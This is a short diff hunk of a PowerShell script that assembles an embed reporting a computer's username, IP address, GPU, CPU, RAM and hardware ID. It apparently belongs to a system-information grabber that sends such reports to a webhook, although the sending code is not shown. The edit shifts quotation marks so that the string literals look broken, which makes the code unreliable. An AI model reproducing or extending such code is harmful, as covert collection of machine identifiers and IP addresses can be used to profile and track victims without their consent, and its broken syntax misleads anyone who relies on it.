@@ -96,11 +96,11 @@ $thumbnailObject = [PSCustomObject]@{
 }
 $color = '12517376'
 $title = 'Info of '
-$description = 'IP: ' + '`' + $ip + '`' + '
+$description = 'IP: ' + '`' + $ip + '`' + 
 GPU: ' + '`' + $GPU + '`' + '
 CPU: ' + '`' + $CPU + '`' + '
 RAM: ' + '`' + $ram + '`' + '
-HWID: ' + '`' + $hwid + '`' 
+HWID: ' + '`' + $hwid + '`' '
 $embedObject = [PSCustomObject]@{
     color = $color
     title = $title + '`' + $env:UserName + '`'
